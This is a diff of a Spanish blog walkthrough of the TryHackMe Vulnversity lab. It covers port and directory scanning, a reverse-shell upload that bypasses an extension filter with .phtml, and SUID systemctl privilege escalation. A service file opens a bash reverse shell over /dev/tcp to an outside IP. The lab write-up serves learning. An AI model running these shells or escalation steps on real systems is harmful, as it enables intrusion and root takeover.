@@ -281,50 +281,57 @@
     <div><h2 id="introducción">Introducción</h2>
 <p>Vulnversity es la primera máquina a vulnerar del learning path “Offensive Pentesting” de TryHackMe. Es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “Jr Penetration Tester”. El objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.</p>
 <h2 id="recopilación-de-información-reconocimiento">Recopilación de Información (Reconocimiento)</h2>
-<p>Comenzamos con un escaneo de puertos utilizando Nmap para enumerar los servicios en la máquina:</p>
+<p>Comienzo con un escaneo de puertos utilizando Nmap para enumerar los servicios en la máquina:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -p- -T4 -oN nmap_scan 10.10.71.251
-</span></span></code></pre></div><p>Los resultados revelaron varios puertos abiertos, incluidos el 21 (FTP), 22 (SSH), 139 (NetBIOS-SSN), 445 (Microsoft-DS), 3128 (Squid HTTP Proxy) y 3333 (HTTP).</p>
+</span></span></code></pre></div><p>Los resultados muestran varios puertos abiertos, incluidos el 21 (FTP), 22 (SSH), 139 (NetBIOS-SSN), 445 (Microsoft-DS), 3128 (Squid HTTP Proxy) y 3333 (HTTP).</p>
 <h2 id="enumeración-web">Enumeración Web</h2>
 <h3 id="escaneo-de-directorios-con-gobuster">Escaneo de Directorios con Gobuster</h3>
-<p>Luego, decidí realizar un escaneo de directorios en el servidor web que se ejecutaba en el puerto 3333. Utilicé Gobuster con la lista de directorios predeterminada:</p>
+<p>Hago un escaneo de directorios en el servidor web que se ejecuta en el puerto 3333. Uso Gobuster con la lista de directorios predeterminada:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.71.251:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
-</span></span></code></pre></div><p>El escaneo reveló un directorio llamado <code>/internal</code>.</p>
+</span></span></code></pre></div><p>El escaneo encuentra un directorio llamado <code>/internal</code>.</p>
 <h3 id="explotación-de-la-vulnerabilidad">Explotación de la Vulnerabilidad</h3>
-<p>Mi siguiente paso fue intentar subir un archivo PHP como shell inversa, pero me encontré con restricciones en la extensión del archivo. Luego, creé una lista de extensiones PHP y utilicé Burp Suite para realizar un ataque &ldquo;sniper&rdquo;.</p>
+<p>Mi siguiente paso es intentar subir un archivo PHP como shell inversa, pero me encuentro con restricciones en la extensión del archivo. Preparo una lista de extensiones PHP y uso Burp Suite para realizar un ataque &ldquo;sniper&rdquo; desde el módulo Repeater.</p>
 <p><img src="/images/post_pics/vulnversity/burp_suite.png" alt="Burp Suite"></p>
-<p>Después de varios intentos, descubrí que la extensión <code>.phtml</code> permitía eludir la comprobación de extensiones de archivos. Subí un archivo llamado <code>shell.phtml</code> que contenía una shell inversa.</p>
+<p>Reviso los resultados de Repeater y compruebo que la extensión <code>.phtml</code> permite eludir la comprobación de extensiones de archivos. Subo un archivo llamado <code>revere-shell.phtml</code> que contiene el código para ejecutar una shell inversa.</p>
 <h3 id="obtención-de-acceso">Obtención de Acceso</h3>
-<p>Para obtener acceso, abrí una shell inversa utilizando Netcat:</p>
+<p>Para obtener acceso, abro un listener con Netcat:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">1234</span>
 </span></span></code></pre></div><p>Luego, para estabilizar la shell y mejorar su funcionalidad, ejecuté el comando:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span></code></pre></div><p>Además, configuré la variable de entorno <code>TERM</code> para <code>xterm</code> con:</p>
+</span></span></code></pre></div><p>Además, configuro la variable de entorno <code>TERM</code> para <code>xterm</code> con:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
-</span></span></code></pre></div><h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+</span></span></code></pre></div><p>De esta forma, puedo usar comandos como <code>clear</code> y <code>Ctrl + C</code> en la shell.</p>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
 <h3 id="enumeración-de-usuarios">Enumeración de Usuarios</h3>
-<p>Mientras exploraba el sistema, noté que había un usuario llamado &ldquo;bill&rdquo; en el directorio <code>/home</code>.</p>
+<p>Mientras exploro el sistema vulnerado, encuentro  un usuario llamado &ldquo;bill&rdquo; en el directorio <code>/home</code>.</p>
 <h3 id="búsqueda-de-binarios-suid">Búsqueda de Binarios SUID</h3>
-<p>Luego, utilicé el comando <code>find</code> para buscar binarios con el bit SUID y SGID habilitados:</p>
+<p>Luego, usando el comando <code>find</code>,  me pongo a buscar binarios con el bit SUID y SGID habilitados:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -perm -u<span style="color:#f92672">=</span>s -o -type f -perm -g<span style="color:#f92672">=</span>s 2&gt;/dev/null
-</span></span></code></pre></div><p>Me llamó la atención el binario <code>/bin/systemctl</code>, que tenía el bit SUID habilitado.</p>
+</span></span></code></pre></div><p>Me llama la atención el binario <code>/bin/systemctl</code>, que tiene el bit SUID habilitado.</p>
 <h3 id="escalada-de-privilegios-con-systemctl">Escalada de Privilegios con systemctl</h3>
-<p>Investigué <code>/bin/systemctl</code> en GTFOBins y encontré una forma de escalada de privilegios. Modifiqué un archivo de servicio temporal para ejecutar un shell inverso. Luego, establecí un listener en mi máquina local y reinicié el servicio temporal. Finalmente, obtuve una shell de root en el sistema objetivo.</p>
-<h2 id="obtención-de-una-shell-de-root">Obtención de una Shell de Root</h2>
-<p>Para obtener una shell de root, modifiqué el archivo de servicio temporal (<code>*.service</code>) vinculado a <code>/bin/systemctl</code> para ejecutar un shell inverso como root. Aquí está la configuración del archivo de servicio:</p>
+<p>Investigo <code>/bin/systemctl</code> en GTFOBins y encuentro una forma de escalada de privilegios para <code>systemctl</code> . El ejemplo de GTFOBins es el siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/bash -c &#34;id &gt; /tmp/output&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span></code></pre></div><h2 id="obtención-de-una-shell-de-root">Obtención de una Shell de Root</h2>
+<p>Para obtener una shell de root, modifico el archivo de servicio temporal (<code>*.service</code>) vinculado a <code>/bin/systemctl</code> para ejecutar un shell inverso como root. Aquí está la configuración del archivo de servicio:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>Type<span style="color:#f92672">=</span>oneshot
 </span></span><span style="display:flex;"><span>ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.14.50.184/4444 0&gt;&amp;1&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>WantedBy<span style="color:#f92672">=</span>multi-user.target
-</span></span></code></pre></div><p>Luego, reinicié el servicio temporal:</p>
+</span></span></code></pre></div><p>Reinicio el servicio temporal:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/systemctl systemctl link $TF
-</span></span></code></pre></div><p>Y por ultimo ejecute el siguiente comando para obtener una shell de root:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/systemctl enable $TF --now
-</span></span></code></pre></div><p>En mi máquina local, configuré un listener en el puerto 4444:</p>
+</span></span></code></pre></div><p>En mi máquina local, configuro un listener en el puerto 4444:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><p>Una vez reiniciado el servicio temporal en la máquina objetivo, obtuve una shell de root en mi máquina local.</p>
+</span></span></code></pre></div><p>Y por ultimo activo el servicio temporal para que se ejecute ahora:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/systemctl enable $TF --now
+</span></span></code></pre></div><p>Una vez reiniciado el servicio temporal en la máquina objetivo, obtengo una shell de root en mi máquina.</p>
 <h2 id="conclusión">Conclusión</h2>
-<p>Vulnversity resultó ser una máquina idónea para principiantes, ya que permite practicar y aplicar conceptos fundamentales que serán muy útiles en posteriores máquinas del learning path “Offensive Pentesting”:</p>
+<p>Vulnversity es una máquina idónea para principiantes, ya que permite practicar y aplicar conceptos fundamentales que serán muy útiles en posteriores máquinas del learning path “Offensive Pentesting”:</p>
 <ul>
 <li>Enumeración de servicios y puertos mediante herramientas como Nmap.</li>
 <li>Escaneo de directorios en un servidor web utilizando Gobuster.</li>
